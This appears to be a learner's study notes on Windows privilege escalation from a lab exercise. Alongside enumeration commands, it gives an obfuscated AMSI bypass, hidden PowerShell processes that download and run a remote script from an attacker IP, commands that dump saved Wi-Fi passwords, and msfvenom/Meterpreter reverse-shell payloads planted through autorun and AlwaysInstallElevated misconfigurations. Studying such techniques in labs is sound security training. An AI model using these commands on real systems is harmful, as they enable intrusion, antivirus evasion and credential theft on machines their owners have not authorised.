https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#summary
https://book.jorianwoltjer.com/windows/local-privilege-escalation

This link is an all comprehensive list of methods to escalate privileges on windows.

In this note I will document all the topics and commands/tools I read thru and tried.
The goal is to solidify my knowledge and memorize essential commands and not be reliant on tools/scripts to enumerate windows machines.

## Initial foothold

After achieving a shell with a low level capabilities, here is how to start enumerating.
Just remember to get a manual page or usage instructions try `/?` 0r `-h` or `--help` or just a command name.

```powershell
systeminfo # lots of information about the system
# combine with...
systeminfo | findstr /B /C:"OS Name:" /C:"OS Version:" # /B - beggining of line, /C - literal str match

wmic qfe # shows patches aka hotfixes installed on the system
# for an cleaner output we can specify columns
wmic qfe get Caption,Description,HotFixID,InstalledOn

# list storage drives, same as previous command
wmic logicaldisk get caption,description,providername

# if you don't have access to wget/curl
certutil -urlcache -f http://IPADDR/filename.ext filename.ext
```


## User and groups

```powershell
whoami # el classico
whoami /priv # displays a list of privs with columns of 'name', 'description', 'state' of priv.
whoami /groups # displays what groups the user is part of and what kind of privileges does that goup have.

net user # show users on the machine.
net user "user_name" # show info about user.

net localgroup # displays users that part of a group if supplied otherwise lists groups.
```

In privileges there are tokens which can be impersonated to escalate privileges, this topic will be covered further down the line.
Here is a list of privileges and information about escalating them.
https://github.com/gtworek/Priv2Admin

```powershell
C:\Users\Joe>whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
============================= ==================================== ========
SeLockMemoryPrivilege         Lock pages in memory                 Disabled
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working set       Disabled
SeTimeZonePrivilege           Change the time zone                 Disabled
```

The idea of moving laterally and vertically in the windows environment is to explore your attack surface with the goal to eventually escalate to NT_AUTHORITY.
Moving laterally is for example **pivoting** to the user from an webservice user thus increasing our capabilities and privileges.
Moving vertically is **escalating** privileges.

## Network enumeration

```powershell
ipconfig /all # network configuration - dns server could be a domain controller aka top machine of win servers.
arp -a # address resolution protocol - maps networks and pairs MAC addresses to IP addresses - will display IP of a machine that ARP found.

route print # can help you identify an another NIC on the machine or a subnet.
netstat -ano # classic TCP/UDP connections display. Will show lots of ports that do not show up on your scan, these can be used for portforwarding.
```

```powershell
netsh wlan show profile # SSID of the network
netsh wlan show profile "SSID" key=clear # will show AP password in clear text
```

These commands will help us learn more about the network the machine is connected to, and the network configuration itself.

## Password **hunting**

SAM passwords - topic.

```powershell
findstr /si password *.txt # searches only in current directory - good idea would be to search in System32 path and add also *.ini *.config
cmdkey /list # lists accounts that have saved passwords and emails associated with them.
```


## Firewall & Anti Virus enumeration

```powershell
Get-MpComputerStatus # av status and info POWERSHELL
sc query windefend # ** ONLY IN CMD ** status and info about windows defender. sc - service control
sc queryex type= service # lists all running services - tells you what kind of AV and other defense software is there. (long output)

netsh advfirewall firewall dump # firewall info - might require admin privs.
netsh firewall show state # older command most likely to work and not requre admin privs.
netsh firewall show config # configuration for firewall.
```


## Automation tools

![[Pasted image 20250428174400.png]]
Having many tools in your toolbelt is beneficial.
Every privilege escalation is going to be different and will have different road blocks.

Sometimes you will not be able to use Metasploit suggester or Powershell might not work, or executables will simply not run.
Thus having many tools and understanding of what they do is the key.


## Cool stuff

```powershell
# run powershell script from web
# raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1
PS C:\> IEX(New-Object System.Net.WebClient).DownloadString('https://url_to_script');


IEX(New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1');
# enables all things in whoami /priv


# amsi disable - run powershell scripts that flag ScriptContainedMaliciousContent.
$a = 'System.Management.Automation.A';$b = 'ms';$u = 'Utils'
$assembly = [Ref].Assembly.GetType(('{0}{1}i{2}' -f $a,$b,$u))
$field = $assembly.GetField(('a{0}iInitFailed' -f $b),'NonPublic,Static')
$me = $field.GetValue($field)
$me = $field.SetValue($null, [Boolean]"hhfff")

# creates a new PS headless process.
$psi = New-Object System.Diagnostics.ProcessStartInfo
$psi.FileName = "powershell"
$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"pause`""
$psi.CreateNoWindow = $true
$psi.UseShellExecute = $false

[System.Diagnostics.Process]::Start($psi)
# end




$psi = New-Object System.Diagnostics.ProcessStartInfo;
$psi.FileName = "powershell";
$psi.Arguments = "-NoProfile -WindowStyle Hidden -Command `"IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.1.2:8888/kaboom.txt');`"";
$psi.CreateNoWindow = $true;
$psi.UseShellExecute = $false;
[System.Diagnostics.Process]::Start($psi);
exit;

```

## Token impersonation

**What are tokens?**
You can think of them as web cookies.
Instead of having to login each time or type in your password you utilize a token/cookie.
So in short tokens are temporary keys.

**Two types of tokens:**
	Delegate - create for logging in via Remote desktop.
	Impersonate - created for performing an action such as running a script - non interactive.

These tokens are temporary and go away when the system is rebooted.
We can use these tokens to our advantage.

## Practical Learning - THM - Windows PrivEsc Arena

## Registry Escalation

##### Autorun

*Detection*

![[Pasted image 20250430134324.png]]

In the first example we will be covering how to exploit a program that runs on logon/startup and has `file_all_access` privileges.
As `accesschk64.exe` pointed out, the program `My Program` for users that fall into category `Everyone` have this privilege `file_all_access`.

That privilege is present in other groups such as `NT AUTHORITY\SYSTEM` and `BUILTIN\Administrators`.
The privilege gives you 'All possible access rights for a file'.

*Exploitation*

This will cover how to utilize Metasploit to run a listener, generate a payload (tcp reverse shell) which executes on logon.

`kali$ msfconsole`
`msf6> use multi/handler`
`msf6> set payload windows/meterpreter/reverse_tcp`
`msf6> set lhost <attacker_ip>`
`msf6> run`
(listener is running if it hangs, that's good.)

`kali$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> -f exe -o program.exe`
Transfer generated payload `program.exe` onto the target windows machine.

-in windows machine-
Place the payload in `C:\Program Files\Autorun Program`.
To simulate privilege escalation effect, relog as admin user.

-in kali- 
`msf6> sessions -i <ID>`
`msf6> getuid`
to confirm the session.

#### AlwaysInstallElevated

This is a misconfiguration.
Not a default configuration.

*Detection*

`cmd$ reg query HKLM\Software\Policies\Microsoft\Windows\Installer` --> 'AlwaysInstallElevated' value is 1.
`cmd$ reg query HKCU\Software\Policies\Microsoft\Windows\Installer` --> 'AlwaysInstallElevated' value is 1.

*Exploitation*

`kali$ msfconsole`
`msf6> use multi/handler`
`msf6> set payload windows/meterpreter/reverse_tcp`
`msf6> set lhost <attacker_ip>`
`msf6> run`
`kali$ msfvenom -p windows/meterpreter/reverse_tcp lhost=<attacker_ip> -f msi -o setup.msi` (msi - Microsoft software installer)

Transfer the payload to target windows machine in `C:\Temp".
`cmd$ msiexec /quiet /qn /i C:\Temp\setup.msi`

## Service Escalation

##### Registry

##### DLL Hijacking